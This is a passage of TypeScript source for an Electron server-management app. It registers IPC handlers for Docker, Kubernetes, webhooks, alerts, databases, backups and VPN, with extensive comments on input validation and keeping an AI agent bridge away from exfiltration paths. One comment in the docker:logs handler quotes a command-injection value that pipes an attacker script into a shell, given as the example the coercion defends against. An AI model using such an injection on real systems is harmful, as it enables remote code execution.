// terminal on these hosts — but it is not the same as the feature being absent,
// and a reader of the paragraph above could reasonably assume otherwise.
const dockerReader = new DockerReader({
  exec: (cfg, command, timeoutMs) =>
    // allowPrompt left TRUE here, unlike broadcast, log tailing and cron, and
    // the difference is deliberate. Those three fan out; this reads ONE server
    // the user just chose from a dropdown and pressed a button for. That is
    // precisely the moment a trust-on-first-use dialog is answerable — "I am
    // connecting to this host right now, is that its fingerprint?" — rather than
    // one of fifteen identical modals nobody can reason about.
    sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs)
})

// ---- Kubernetes ----
//
// Read-only, and the module comment in shared/kubernetes.ts says where the line
// is: no context switching (that rewrites the user's kubeconfig for every
// process on the host), no exec, nothing that writes. Contexts are chosen per
// read with --context.
//
// allowPrompt stays true for the same reason as Docker: one server the user
// picked, not a fan-out.
const k8sReader = new KubernetesReader({
  exec: (cfg, command, timeoutMs) =>
    sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs)
})

ipcMain.handle('k8s:read', (_e, cfg: unknown, context?: string, namespace?: string) =>
  k8sReader.read(cfg, context, namespace)
)
ipcMain.handle(
  'k8s:logs',
  async (_e, cfg: unknown, namespace: string, pod: string, lines: unknown, context?: string) => {
    // buildK8sLogsCommand validates the names and clamps `lines` itself — the
    // argument that is not a string is the one nobody thinks to check.
    const r = await sshExec(
      resolveChainSecrets(cfg as SshConnectConfig),
      buildK8sLogsCommand(namespace, pod, lines as number, context),
      20_000
    )
    return { ok: r.ok, output: `${r.stdout ?? ''}${r.stderr ?? ''}`, error: r.error }
  }
)

ipcMain.handle(
  'k8s:diagnose',
  (_e, cfg: unknown, namespace: string, pod: string, context?: string, previousLines?: unknown) => {
    // Coerced and clamped here, not trusted from the annotation. An IPC
    // argument arrives as a structured-clone value with no runtime type, which
    // is exactly how the docker:logs `lines` injection got in.
    const n = Math.floor(Number(previousLines))
    const safe = Number.isFinite(n) ? Math.min(5_000, Math.max(1, n)) : undefined
    return k8sReader.diagnose(cfg, namespace, pod, context, safe)
  }
)
ipcMain.handle('k8s:overview', (_e, cfg: unknown, context?: string, namespace?: string) =>
  k8sReader.overview(cfg, context, namespace)
)
ipcMain.handle('k8s:usage', (_e, cfg: unknown, context?: string, namespace?: string) =>
  k8sReader.usage(cfg, context, namespace)
)
// The only state-changing channel in this module.
//
// `confirmed === true` rather than a truthiness check, and it is NOT the
// security boundary — the renderer is not one. It is a guard against a caller
// that reached this channel without going through a dialog, which is a mistake
// worth catching loudly. The real boundaries are that the service re-derives
// the plan itself and the builder throws on an unknown kind or an unsafe name.
ipcMain.handle(
  'k8s:rollout-restart',
  (_e, cfg: unknown, target: K8sRolloutTarget, confirmed: unknown) =>
    k8sReader.rolloutRestart(cfg, target, confirmed === true)
)

ipcMain.handle('docker:list', (_e, cfg: unknown, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
  dockerReader.list(cfg, opts ?? {})
)
ipcMain.handle('docker:can-sudo', (_e, cfg: unknown) => dockerReader.canSudo(cfg))
ipcMain.handle(
  'docker:logs',
  async (_e, cfg: unknown, ref: string, lines: unknown, opts?: DockerLogsOptions) => {
  // `lines: number` was a compile-time annotation only. IPC arguments are
  // structured-clone values with no runtime type, so a renderer — or anything
  // that can reach this channel — could pass "200; curl attacker.sh | sh" and
  // have it interpolated straight into the command. Coerced and clamped here,
  // and validated again inside buildDockerLogsCommand, because the argument
  // that is not a string is exactly the one nobody thinks to check.
  const n = Math.min(5_000, Math.max(1, Math.floor(Number(lines))))
  const safeLines = Number.isFinite(n) ? n : 200
  // buildDockerLogsCommand throws on an invalid reference rather than escaping
  // it; let that surface as a rejected invoke rather than running anything.
  // Every option re-derived from the raw value rather than trusted: these
  // arrive as structured-clone values with no runtime type, and `since` is
  // interpolated, so the builder's own allowlist is the thing that has to see
  // it. `=== true` rather than truthiness for the same reason.
  const logOpts = {
    timestamps: opts?.timestamps === true,
    since: opts?.since
  }
  const readLogs = async (
    sudo: boolean
  ): Promise<{ ok: boolean; output: string; error?: string }> => {
    const r = await sshExec(
      resolveChainSecrets(cfg as SshConnectConfig),
      buildDockerLogsCommand(ref, safeLines, false, { ...logOpts, sudo }),
      20_000
    )
    return { ok: r.ok, output: `${r.stdout ?? ''}${r.stderr ?? ''}`, error: r.error }
  }

  // Same failover the container LIST already had, and it has to be here too:
  // reading the list as root and then refusing to read a log is one feature
  // behaving as two. Reported by an operator whose containers listed fine and
  // whose logs said permission denied.
  const first = await readLogs(opts?.sudo === true)
  if (opts?.sudo === true || !DOCKER_SOCKET_REFUSED.test(first.output)) return first
  if (!(await dockerReader.canSudo(cfg))) return first
  const elevated = await readLogs(true)
  // If root does not help either, the first refusal is the one that describes
  // the user's situation.
  return DOCKER_SOCKET_REFUSED.test(elevated.output) ? first : elevated
})

ipcMain.handle('docker:disk', (_e, cfg: unknown, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
  dockerReader.disk(cfg, opts ?? {})
)
// The itemised form of the same read. Still read-only: it lists what is on the
// disk, and nothing on this channel or below it can remove any of it.
ipcMain.handle('docker:disk-detail', (_e, cfg: unknown, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
  dockerReader.diskDetail(cfg, opts ?? {})
)
ipcMain.handle(
  'docker:inspect',
  (_e, cfg: unknown, ref: string, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
    dockerReader.inspect(cfg, ref, opts ?? {})
)
ipcMain.handle(
  'docker:stats',
  (_e, cfg: unknown, refs: string[], opts?: { sudo?: boolean; autoSudo?: boolean }) =>
    dockerReader.stats(cfg, refs, opts ?? {})
)
// The only state-changing docker channel.
//
// The builders validate the action against an allow-list and every ref against
// what docker actually permits, and they THROW rather than escaping — so a
// refused build surfaces as a rejected invoke instead of running anything. That
// is deliberate: a bad ref here is a bug or an attack, not a host condition.
//
// `act` does not auto-escalate, unlike the read paths. The user approved
// "restart this container", not "restart it as root if the socket refuses",
// and a passwordless sudoers entry is not consent to a state change.
ipcMain.handle(
  'docker:act',
  (
    _e,
    cfg: unknown,
    action: DockerAction,
    refs: string[],
    opts?: { sudo?: boolean; timeoutSec?: number }
  ) => dockerReader.act(cfg, action, refs, opts ?? {})
)

// ---- Compose ----
//
// The FILE half of docker, and it registers next to it because it shares the
// module toggle and the same exec. What it does NOT share is a verb: nothing on
// these channels stops, removes or deletes anything. `pull` and `up -d` are not
// here at all — they go through the job engine as a `JobSpec`, so they inherit
// the approval record, the resume check and the audit row rather than growing
// their own, and this file has no compose channel that runs either one.
//
// The one channel that writes is `compose:write-image-tag`, and it writes ONE
// LINE of ONE file. The service re-reads the file and re-plans the edit against
// what is on the host, then refuses when that disagrees with what the operator
// was shown; a plan arriving over IPC is a claim about a file, not a fact about
// one, and the renderer is not a trust boundary.
//
// There is no channel that returns the contents of a `.env`. `compose:env-names`
// runs an awk program on the remote host that prints variable NAMES, and the
// values are gone before the SSH channel sees them — so they are not in this
// process, not in a rejected promise, and cannot reach an error detail. See the
// header of shared/compose.ts for why that is the whole shape of the feature.
const composeReader = new ComposeReader({
  exec: (cfg, command, timeoutMs) =>
    // allowPrompt true, matching Docker above and for the same reason: this is
    // one server the operator just chose, not a fan-out, which is the only
    // moment a trust-on-first-use dialog is answerable.
    sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs)
})

ipcMain.handle(
  'compose:list',
  (_e, cfg: unknown, opts?: { sudo?: boolean; autoSudo?: boolean; search?: boolean }) =>
    composeReader.list(cfg, opts ?? {})
)
ipcMain.handle(
  'compose:config',
  (_e, cfg: unknown, project: ComposeProjectRef, opts?: { sudo?: boolean; autoSudo?: boolean }) =>
    composeReader.config(cfg, project, opts ?? {})
)
// Names only. There is no form of this that returns a value; see the builder.
ipcMain.handle(
  'compose:env-names',
  (_e, cfg: unknown, paths: string[], opts?: { sudo?: boolean; autoSudo?: boolean }) =>
    composeReader.envNames(cfg, paths, opts ?? {})
)
ipcMain.handle('compose:read-file', (_e, cfg: unknown, path: string, opts?: { sudo?: boolean }) =>
  composeReader.readFile(cfg, path, opts ?? {})
)
// The only compose channel that changes anything, and it changes one line.
ipcMain.handle(
  'compose:write-image-tag',
  (_e, cfg: unknown, req: ComposeImageWriteRequest, opts?: { sudo?: boolean }) =>
    composeReader.writeImageTag(cfg, req, opts ?? {})
)

// ---- What is scheduled across the estate ----
//
// Read-only. The command is a constant in shared/cron.ts, not built from any
// input, and every section carries its own `|| true` so a host with no
// /etc/cron.d — or a user with no crontab — still returns the other sections
// rather than failing the collection.
//
// Sequential across hosts, like the fleet sweep, for the same bastion reason.
ipcMain.handle(
  'cron:collect',
  async (_e, targets: { serverId: string; serverName: string; cfg: unknown }[]) => {
    // `sources` says WHICH of the five cron sources each host actually managed
    // to read, and why the rest were not. Without it the panel cannot tell
    // "nothing is scheduled" from "/etc/cron.d is root-only and we were refused"
    // — and on a fully loaded box those look identical and one of them is a lie.
    const out: {
      serverId: string
      serverName: string
      entries: CronEntry[]
      unparsed: number
      sources?: CronSourceReport[]
      error?: string
    }[] = []
    for (const t of targets) {
      try {
        // Reads every online server in one press; same stacked-dialog problem.
        const r = await sshExec(
          resolveChainSecrets(t.cfg as SshConnectConfig),
          CRON_COLLECT_COMMAND,
          20_000,
          false
        )
        if (!r.ok) {
          out.push({ serverId: t.serverId, serverName: t.serverName, entries: [], unparsed: 0, error: r.error })
          continue
        }
        const parsed = parseCronCollection(r.stdout ?? '')
        out.push({
          serverId: t.serverId,
          serverName: t.serverName,
          entries: parsed.entries,
          unparsed: parsed.unparsed.length,
          sources: parsed.sources
        })
      } catch (e) {
        // One host refusing must not lose the others' schedules.
        out.push({
          serverId: t.serverId,
          serverName: t.serverName,
          entries: [],
          unparsed: 0,
          error: e instanceof Error ? e.message : String(e)
        })
      }
    }
    return out
  }
)

// ---- Webhook alerts ----
//
// Delivery lives in main because the renderer's CSP is `connect-src 'self'`
// and cannot make this call. The URL is a bearer credential and never crosses
// back: there is no getter, and `webhook:status` returns only whether one is
// set.
//
// A compromised renderer CAN still aim and fire this, and saying otherwise —
// as an earlier version of this comment did — is the kind of claim that stops
// the next reviewer looking. What limits the damage is not the boundary, it is
// that `webhookNotify` rebuilds every payload from a whitelist
// (`sanitisePayload`) rather than forwarding what it was handed, that
// `post()` never follows a redirect or reads a response body, and that the URL
// is validated on the way in. Without those this IPC is an
// arbitrary-JSON-to-arbitrary-host primitive that walks straight through the
// CSP, which is the only thing making a renderer compromise survivable.
//
// Deliberately NOT reachable from the MCP bridge. An agent that can point a
// webhook at an endpoint it controls has an exfiltration channel out of an app
// whose whole claim is that credentials do not leave it. The tool whitelist in
// tests/localTerminalNotExposed.test.ts fails if anything new is registered,
// which is what keeps that true without anyone having to remember it.
ipcMain.handle('webhook:status', () => webhookStatus())
ipcMain.handle('webhook:delivery', () => webhookDeliveryStatus())
ipcMain.handle('webhook:configure', (_e, cfg: { enabled: boolean; notifyOnResolved: boolean }) =>
  webhookConfigure(cfg)
)
ipcMain.handle('webhook:set-url', (_e, url: string) => {
  // Refuse our own MCP port. Loopback http is allowed (a self-hosted receiver
  // on the same machine is a real setup), but /pair/start is unauthenticated —
  // so a webhook aimed there would raise an agent-pairing prompt in lockstep
  // with every alert, which is a tidy way to get someone to approve one.
  const port = getMcpConfig().port
  try {
    const u = new URL(String(url).trim())
    const loopback = ['localhost', '127.0.0.1', '::1'].includes(u.hostname)
    if (loopback && Number(u.port) === port) {
      return { ok: false, error: `That is ShellPilot's own MCP port (${port}). Pick another endpoint.` }
    }
  } catch {
    // Not a URL — webhookSetUrl reports that properly.
  }
  return webhookSetUrl(url)
})
ipcMain.handle('webhook:test', () => webhookTest())
ipcMain.handle('webhook:notify', (_e, payload: AlertPayload) => {
  webhookNotify(payload)
})

// ---- The alert log ----
//
// Roadmap item 19b. Every raise and resolve the alert store decides is written
// here and read back at startup, so suppression survives a restart. Before it,
// the repeat window lived in a renderer Map: a disk that has been at 91% for a
// month re-announced itself on every launch, and the only defence against that
// is the mute button.
//
// Two named methods over the history store's own named statements. There is
// deliberately no filter argument, no ordering argument and nothing resembling
// a query: the store's design rule is that no SQL crosses its boundary in
// either direction, and an "just let the caller pass a WHERE" surface here is
// exactly how that rule would be lost.
ipcMain.handle('alerts:record', (_e, raw: unknown, at?: number) => {
  const event = sanitiseStoredAlert(raw)
  // A row that did not survive the whitelist is dropped and NOT written as a
  // partial. A half-row in the inbox reads as an alert nobody can explain.
  if (!event) return false
  if (!historyStore) return false
  historyStore.recordEvent(
    ALERT_HISTORY_KIND,
    event.serverId,
    event,
    typeof at === 'number' && Number.isFinite(at) ? at : undefined
  )
  return true
})

/**
 * How far back the alert log is read.
 *
 * A ROW COUNT was the wrong bound and it re-created the exact failure the
 * durable half of item 19b exists to end. `ORDER BY ts DESC LIMIT 500` drops
 * the OLDEST rows first, and the oldest rows are the chronic alerts this whole
 * feature is for: six hundred rows of newer CPU noise — which one busy estate
 * produces in an afternoon, since CPU's repeat window is sixty seconds — push
 * a disk that has been at 91% for a month out of the window, and it
 * re-announces itself immediately after every restart. Forever, because the
 * replacement row is written with the ORIGINAL `at` and lands outside the
 * newest-500 window again.
 *
 * So the bound is TIME. Thirty days is longer than any outstanding alert can
 * plausibly go without a corroborating row — the longest repeat window in the
 * store is six hours, a snooze is at most a day — and it is well inside what
 * the history store keeps.
 *
 * ROW_BUDGET is a ceiling on the read, not the bound: it is what stops a
 * pathological log from being loaded whole. It is five thousand rather than
 * five hundred so that reaching it takes an estate that raises an alert every
 * eight minutes for a month, and if it is ever reached the oldest rows are
 * still what falls out — stated here rather than left to be rediscovered.
 */
const ALERT_HYDRATION_WINDOW_MS = 30 * 86_400_000
const ALERT_HYDRATION_ROW_BUDGET = 5000

ipcMain.handle('alerts:history', (_e, limit?: number): StoredAlertRow[] => {
  if (!historyStore) return []
  // The page size, not the answer size. The caller's number is how much to ask
  // for at a time; the window below is what decides when to stop.
  const n = typeof limit === 'number' && Number.isFinite(limit) ? Math.max(1, Math.min(2000, Math.floor(limit))) : 500
  const from = Date.now() - ALERT_HYDRATION_WINDOW_MS
  const out: StoredAlertRow[] = []
  let cursor: EventCursor | undefined
  while (out.length < ALERT_HYDRATION_ROW_BUDGET) {
    const page = historyStore.readEvents({ kind: ALERT_HISTORY_KIND, limit: n, from, cursor })
    if (page.length === 0) break
    for (const row of page) {
      // Sanitised on the way OUT as well as the way in. The rows on disk predate
      // whatever version is reading them, and a kind this build does not know is
      // not a kind it can render or reason about.
      const event = sanitiseStoredAlert(row.payload)
      if (event) out.push({ ...event, at: row.ts })
    }
    if (page.length < n) break
    cursor = page[page.length - 1].cursor
  }
  return out
})
/**
 * Item 18's database verdicts, for item 19b to alert on.
 *
 * `notableDbEvents` writes them under their own history kinds, so this is two
 * named reads and a whitelist — the same shape as `alerts:history` above and
 * for the same reason. It carries the connection id, the question and the
 * store's timestamp, and nothing else: the payload also holds a headline and a
 * "because" written for a person, and prose assembled from a report has no
 * business on a path that ends in a Slack message.
 *
 * The verdict is NOT recomputed. The level is the kind the row was written
 * under. An alert that re-derived it could disagree with the screen item 18
 * renders, which is exactly the trap the disk alert avoided by making
 * `isDiskCritical` the only comparison.
 */
ipcMain.handle('alerts:db-events', (_e, limit?: number): StoredDbAlertRow[] => {
  if (!historyStore) return []
  const n = typeof limit === 'number' && Number.isFinite(limit) ? Math.max(1, Math.min(500, Math.floor(limit))) : 200
  // Bounded by the same window the alert log is hydrated over, and that pairing
  // is the point rather than tidiness. `seenEvents` — the only thing that stops
  // an occurrence being announced twice — is seeded from `alerts:history`, so a
  // db row older than that window arrives with nothing to recognise it and is
  // announced again on every launch. Offering a row this process cannot
  // remember having announced is offering it forever.
  const from = Date.now() - ALERT_HYDRATION_WINDOW_MS
  const out: StoredDbAlertRow[] = []
  for (const kind of DB_ALERT_HISTORY_KINDS) {
    for (const row of historyStore.readEvents({ kind, limit: n, from })) {
      const p = row.payload
      if (typeof p !== 'object' || p === null) continue
      const r = p as Record<string, unknown>
      // Both are ours and both are short. A row missing either is dropped
      // rather than filled in: a database alert naming no database and no
      // question is a row nobody can act on.
      if (typeof r.connectionId !== 'string' || r.connectionId === '') continue
      if (typeof r.question !== 'string' || r.question === '') continue
      out.push({
        kind,
        connectionId: r.connectionId.slice(0, 200),
        question: r.question.slice(0, 200),
        at: row.ts
      })
    }
  }
  // Two reads, one timeline. Newest first, like every other history read.
  out.sort((a, b) => b.at - a.at)
  return out.slice(0, n)
})

// ---- Capacity trends — roadmap item 26 ----
//
// One named read and one pure function. No filter argument and no metric
// argument, for exactly the reason `alerts:history` has none: the history
// store's rule is named statements only, and "let the caller say which series
// over which range with which aggregate" is the query surface that rule exists
// to refuse.
//
// What crosses IPC is the ANSWER — a drawable line, and a forecast or the
// reason there is not one — not the samples behind it. A 90-day window holds
// about seven thousand points per metric; shipping twenty-one thousand of them
// to the renderer to be averaged down into eight hundred pixels is how "a query
// and a chart" turns into the metrics warehouse the roadmap says not to build.
ipcMain.handle(
  'capacity:trends',
  (_e, hostId: unknown, windowDays: unknown): CapacityReport | null => {
    if (!historyStore) return null
    // Not a string is not a host. The renderer passes a server id; anything
    // else is a caller bug and must not read the whole time range.
    if (typeof hostId !== 'string' || hostId === '') return null
    // Clamped to what the store actually retains. A window wider than the
    // horizon would return a quarter of data under a label saying a year, and
    // the forecast states the window it was drawn from — so the label matters.
    const days =
      typeof windowDays === 'number' && Number.isFinite(windowDays)
        ? Math.max(1, Math.min(RETENTION_HOURLY_DAYS, Math.floor(windowDays)))
        : 7
    const now = Date.now()
    const from = now - days * 86_400_000
    return buildCapacityReport(hostId, historyStore.readTrends(hostId, from, now), {
      now,
      from,
      to: now,
      thresholds: CAPACITY_THRESHOLDS,
      // Carried into the report rather than duplicated in the panel: the
      // renderer cannot import a main-process constant, and a panel with "7
      // days" typed into it goes on saying that after the policy changes.
      fullResolutionDays: RETENTION_FULL_DAYS,
      retainedDays: RETENTION_HOURLY_DAYS
    })
  }
)

// ---- The change log — roadmap item 14 ----
//
// A READ of four records that already exist, merged into one timeline. It
// writes nothing, stores nothing and starts nothing in the background; every
// row it returns was written by something else for its own reasons.
//
// THE MODULE FLAG IS CHECKED INSIDE readChangeLog, not around this handler, and
// that is deliberate. A handler guarded from the outside would return an empty
// page when the module is off, which is indistinguishable on screen from a
// quiet week — the exact confusion this feature exists to prevent. Passing the
// flag in means the page comes back saying "switched off, nothing was opened",
// and the panel can say so.
//
// There is deliberately no MCP tool beside this, for the reason `fleet:posture`
// has none: a merged account of everything a person did on every host is not
// something an agent gets to ask for. It is also the one place in the app that
// reads `shellpilot-ai-audit.jsonl`, and that file's value rests on its rows
// being an agent's rather than about one.
ipcMain.handle('changelog:read', (_e, filter: unknown): ChangeLogPage => {
  // Not an object is not a filter. An unparseable argument must narrow the
  // read rather than widen it, so it falls back to no filter and the page's own
  // limit rather than to whatever the caller sent.
  const f: ChangeLogFilter =
    filter !== null && typeof filter === 'object' ? (filter as ChangeLogFilter) : {}
  return readChangeLog(
    {
      enabled: () => changeLogModuleOn,
      // The same store every other history read uses, or null before it opens
      // and forever on a machine where history is switched off — in which case
      // the page says the store is not there rather than showing three sources
      // and calling it a timeline.
      history: () => historyStore
    },
    f
  )
})

ipcMain.handle('fleet:sample-now', async () => {
  await fleetSampler.sampleNow()
  return fleetSampler.status()
})

// ---- Databases ----
// withVpnTransportDb resolves the profile from the saved record, so a
// connection cannot skip its VPN just because one call site predates the
// feature.
ipcMain.handle('db:test', (_e, cfg: DbConnectConfig) => dbTest(withVpnTransportDb(resolveDbSecrets(cfg))))
ipcMain.handle('db:query', (_e, cfg: DbConnectConfig, text: string) =>
  dbQuery(withVpnTransportDb(resolveDbSecrets(cfg)), text)
)
ipcMain.handle('db:info', (_e, cfg: DbConnectConfig) => dbInfo(withVpnTransportDb(resolveDbSecrets(cfg))))
ipcMain.handle('db:shell', (_e, cfg: DbConnectConfig, line: string) =>
  dbShell(withVpnTransportDb(resolveDbSecrets(cfg)), line)
)
ipcMain.handle('db:close', (_e, id: string) => dbClose(id))
// Operational reads (roadmap 18). Strictly read-only — see the refusal written
// down at the top of src/shared/dbOps.ts. Notable states are recorded as
// history events so item 19b can alert on them later; the alerting itself is
// deliberately NOT here.
/**
 * The verdict each question was last recorded at, per connection.
 *
 * `db:ops` runs when somebody presses a button, and it used to write a fresh
 * history row stamped `Date.now()` on every read. The alert store's dedupe key
 * includes `at`, so six reads of ONE standing replication alarm were six
 * distinct occurrences: five notifications, the fifth announcing "this has
 * happened 5 times in 6 hours" about something that happened once and was read
 * five times, and a flap damp earned by pressing Refresh.
 *
 * So an unchanged verdict is not a new occurrence. The row that already stands
 * keeps its original `at`, which is the honest timestamp: it is when the
 * condition was first seen, not when somebody last looked at it.
 *
 * In memory, and deliberately not seeded from the store. A restart is allowed
 * to write one fresh row per standing verdict — that is once per launch rather
 * than once per press, and the alternative is reading history back on a path
 * that is already doing a database round trip. `ok` is tracked here even though
 * it is never written, because it is what tells a later alarm on the same
 * question that it is a NEW occurrence rather than the same one being re-read.
 */
const dbVerdictSeen = new Map<string, string>()

ipcMain.handle('db:ops', async (_e, cfg: DbConnectConfig) => {
  const report = await dbOps(withVpnTransportDb(resolveDbSecrets(cfg)))
  if (report.ok) {
    // Every answer, not just the notable ones: a question that has gone back to
    // `ok` has to be forgotten, or the next time it alarms it looks like the
    // same alarm being re-read and is never written down.
    const notable = new Map(
      notableDbEvents(report).map((e) => [`${report.connectionId}\u0000${String(e.payload.question)}`, e])
    )
    for (const a of report.answers) {
      const seenKey = `${report.connectionId}\u0000${a.id}`
      const event = notable.get(seenKey)
      const level = event ? String(event.payload.level) : a.verdict.level
      if (dbVerdictSeen.get(seenKey) === level) continue
      dbVerdictSeen.set(seenKey, level)
      // hostId is null: a database connection is not a fleet host, and inventing
      // one would put rows in a host's timeline that host never produced.
      if (event) historyStore?.recordEvent(event.kind, null, event.payload)
    }
  }
  return report
})

// ---- SSH config import ----
ipcMain.handle('sshconfig:read', () => {
  const home = app.getPath('home')
  const path = join(home, '.ssh', 'config')
  try {
    // Expand ~ here so the renderer never has to guess the home directory.
    const hosts = parseSshConfig(readFileSync(path, 'utf8')).map((h) =>
      h.identityFile?.startsWith('~')
        ? { ...h, identityFile: join(home, h.identityFile.slice(1)) }
        : h
    )
    return { ok: true, path, hosts }
  } catch (err) {
    const e = err as NodeJS.ErrnoException
    return {
      ok: false,
      path,
      error: e.code === 'ENOENT' ? `No SSH config found at ${path}` : e.message
    }
  }
})

// An approval blocks an AI agent until the user answers it, and the dialog it
// renders lives inside the window. If ShellPilot is not in front, nothing tells
// the user anything is waiting — the agent simply appears to hang for the
// whole timeout, which is exactly how it was reported.
function notifyApprovalPending(request: ApprovalRequest): void {
  if (mainWindow && !mainWindow.isDestroyed()) {
    // Bounces the dock icon on macOS, flashes the taskbar on Windows. Left as
    // 'informational' rather than 'critical': the request expires on its own,
    // so it does not warrant a bouncing icon that will not stop.
    app.dock?.bounce('informational')
    mainWindow.flashFrame(true)
  }
  if (!Notification.isSupported()) return
  const n = new Notification({
    title: `${request.agentName} needs approval`,
    body: `${request.action}\non ${request.serverName}`,
    icon: appIcon()
  })
  n.on('click', () => {
    if (mainWindow && !mainWindow.isDestroyed()) {
      if (mainWindow.isMinimized()) mainWindow.restore()
      mainWindow.show()
      mainWindow.focus()
    }
  })
  n.show()
}

// ---- Notifications ----
// Native OS notifications: they render outside the window, so they can never
// cover the terminal, and the OS handles stacking and dismissal.
ipcMain.handle('notify:show', (_e, title: string, body: string) => {
  if (!Notification.isSupported()) return false
  const n = new Notification({ title, body, silent: true, icon: appIcon() })
  n.on('click', () => {
    if (mainWindow && !mainWindow.isDestroyed()) {
      if (mainWindow.isMinimized()) mainWindow.restore()
      mainWindow.focus()
    }
  })
  n.show()
  return true
})

// ---- Backup ----
ipcMain.handle('backup:export', (_e, password: string) => backupExport(password))
ipcMain.handle('backup:inspect', (_e, password: string, path?: string) => backupInspect(password, path))
ipcMain.handle('backup:import', (_e, password: string, path: string) =>
  backupImport(password, path, closeHistoryNow)
)
ipcMain.handle('backup:deleteAll', () => deleteAllData(closeHistoryNow))
ipcMain.handle('backup:relaunch', () => relaunchApp())

// Destinations. The renderer never sees a credential for any of them: an SFTP
// destination names a server whose secret credentialResolver reads in main, and
// an S3 destination names a vault entry that backupTargets reads in main. What
// crosses this boundary is an id.
ipcMain.handle('backup:destinations', () => readTargets())
ipcMain.handle('backup:saveDestinations', (_e, destinations: BackupDestination[]) =>
  saveDestinations(destinations)
)
ipcMain.handle('backup:runDestination', async (_e, id: string, password: string) => {
  const dest = readTargets().destinations.find((d) => d.id === id)
  if (!dest) {
    const stamp = new Date().toISOString()
    return {
      ok: false,
      destinationId: id,
      destinationName: id,
      destinationKind: 'local',
      startedAt: stamp,
      finishedAt: stamp,
      verified: false,
      restoreTested: false,
      removed: [],
      failedStage: 'write',
      error: 'That destination is no longer configured.'
    }
  }
  const report = await runBackupToDestination(dest, password)
  recordRun(dest.id, report)
  return report
})
ipcMain.handle('backup:listRemote', async (_e, id: string) => {
  const dest = readTargets().destinations.find((d) => d.id === id)
  if (!dest) return { ok: false, error: 'That destination is no longer configured.' }
  return listRemoteBackups(dest)
})
ipcMain.handle('backup:inspectRemote', async (_e, id: string, name: string, password: string) => {
  const dest = readTargets().destinations.find((d) => d.id === id)
  if (!dest) return { ok: false, error: 'That destination is no longer configured.' }
  return inspectRemoteBackup(dest, name, password)
})
ipcMain.handle('backup:discardStaged', (_e, path: string) => discardStagedBackup(path))
// A dump is a source, not a bundle: it is plaintext SQL and is named .sql, so
// retention never counts it as a generation of an encrypted backup. The panel
// says so where the button is.
ipcMain.handle('backup:dumpableDatabases', () => dumpableDatabases())
ipcMain.handle('backup:dumpDatabase', async (_e, destinationId: string, databaseId: string) => {
  const stamp = new Date().toISOString()
  const refuse = (error: string): DumpRunReport => ({
    ok: false,
    destinationId,
    destinationName: destinationId,
    verified: false,
    error,
    startedAt: stamp,
    finishedAt: stamp
  })
  const dest = readTargets().destinations.find((d) => d.id === destinationId)
  if (!dest) return refuse('That destination is no longer configured.')
  const resolved = databaseDumpTarget(databaseId)
  if ('error' in resolved) return refuse(resolved.error)
  return dumpToDestination(dest, resolved.target, resolved.password)
})
ipcMain.handle('backup:chooseDirectory', async () => {
  const win = BrowserWindow.getFocusedWindow() ?? BrowserWindow.getAllWindows()[0]
  const chosen = await dialog.showOpenDialog(win, {
    title: 'Choose a folder for backups',
    properties: ['openDirectory', 'createDirectory']
  })
  return chosen.canceled ? null : (chosen.filePaths[0] ?? null)
})

// ---- Updater ----
ipcMain.handle('updater:check', () => checkForUpdates())
ipcMain.handle('updater:status', () => getUpdaterStatus())
ipcMain.handle('updater:install', () => installUpdate())
ipcMain.handle('updater:openReleasePage', () => openReleasePage())
ipcMain.handle('updater:download', () => downloadUpdate())
ipcMain.handle('updater:getPrefs', () => getUpdaterPrefs())
ipcMain.handle('updater:setPrefs', (_e, patch: Partial<UpdatePrefs>) => setUpdaterPrefs(patch))
ipcMain.handle('updater:capabilities', () => getUpdaterCapabilities())
onUpdaterStatus((s) => {
  if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('updater:status-event', s)
})

// ---- Known hosts ----
ipcMain.handle('knownhosts:list', () => knownHostList())
ipcMain.handle('knownhosts:forget', (_e, id: string) => knownHostForget(id))

// ---- Tunnels ----
ipcMain.handle('tunnel:start', (e, cfg: TunnelConfig, ssh: TunnelSshConfig) =>
  tunnelStart(e.sender, cfg, resolveChainSecrets(ssh))
)
ipcMain.handle('tunnel:stop', (_e, id: string) => tunnelStop(id))
ipcMain.handle('tunnel:list', () => tunnelList())

// ---- VPN ----
ipcMain.handle('vpn:list', () => vpnList())
ipcMain.handle('vpn:profiles', () => vpnProfiles())
ipcMain.handle('vpn:start', (e, id: string) => {
  vpnAttachRenderer(e.sender)
  return vpnStart(id)
})
ipcMain.handle('vpn:stop', (_e, id: string, force?: boolean) => vpnStop(id, { force }))
ipcMain.handle('vpn:reload', (_e, id: string) => vpnReload(id))
ipcMain.handle('vpn:validate', (_e, spec: VpnSpec) => vpnValidate(spec))
ipcMain.handle('vpn:probe', (_e, kind: VpnKind) => vpnProbe(kind))
// Returns a spec plus the stripped-directive report, and nothing else: the
// key material stays in main until the user commits the import.
ipcMain.handle('vpn:import', (_e, kind: VpnKind, text: string, baseDir?: string) =>
  vpnImport(kind, text, baseDir)
)
ipcMain.handle(
  'vpn:commitImport',
  (_e, name: string, workspaceId: string, kind: VpnKind, text: string, baseDir?: string) =>
    vpnCommitImport(name, workspaceId, kind, text, baseDir)
)
ipcMain.handle('vpn:deleteSecrets', (_e, vaultEntryId: string) => vpnDeleteSecrets(vaultEntryId))
// Two channels, because they do two different things to the vault.
//
// `wireguardKeygen` writes; `wireguardMint` does not. The profile form
// generates through the mint channel and holds the pair, then stores through
// the other one only if the user presses Save — so cancelling a dialog after
// pressing "Generate keypair" no longer leaves an entry behind that no profile
// references. Both bodies live in services/vpn/keys.ts, where the reasoning and
// the tests for that split are.
ipcMain.handle('vpn:wireguardMint', (): Promise<VpnMintResult> => mintKeypair())
ipcMain.handle(
  'vpn:wireguardKeygen',
  (
    _e,
    req: { profileName: string; workspaceId: string; privateKey: string; replaces?: string }
  ): Promise<VpnKeygenResult> => storeKeypair(req)
)
// `wg pubkey`, and nothing else: no vault write, no side effect, safe to call
// while the user is still typing. It exists because a private key is useless
// until you can tell your server which public key to authorise.
ipcMain.handle(
  'vpn:wireguardPublicKey',
  async (_e, privateKey: string): Promise<VpnPublicKeyResult> => {
    try {
      const pair = await wireguardDriver.keygen({ publicKeyFor: privateKey })
      return { ok: true, publicKey: pair.publicKey }
